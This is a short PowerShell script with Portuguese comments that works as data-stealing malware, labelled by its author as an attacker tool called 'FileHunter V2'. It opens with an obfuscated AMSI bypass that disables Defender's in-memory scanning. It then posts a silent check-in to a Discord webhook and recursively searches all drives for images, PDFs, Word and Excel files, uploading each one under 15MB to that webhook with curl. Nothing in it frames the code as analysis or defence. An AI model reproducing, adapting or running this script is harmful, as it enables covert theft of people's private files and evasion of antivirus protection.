# [Bypass AMSI Ofuscado] - Evita a deteção de assinatura do Defender na memória
$b = "System.Management.Automation.Amsi" + "Utils"; 
$c = [Ref].Assembly.GetType($b); 
$c.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)

# Configurações do Atacante
$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx') 

# Notificação Inicial Silenciosa
curl.exe -k -s -F "content=FileHunter V2 (Bypass ON) iniciado: $env:COMPUTERNAME" $u

# Procura e Exfiltração
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $root = $_.Root
    Get-ChildItem -Path $root -Include $e -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Length -lt 15MB) { # Limite reduzido para maior velocidade
            $arg = 'file=@' + $_.FullName
            curl.exe -k -s -F $arg $u
        }
    }
}

# Saída limpa
exit
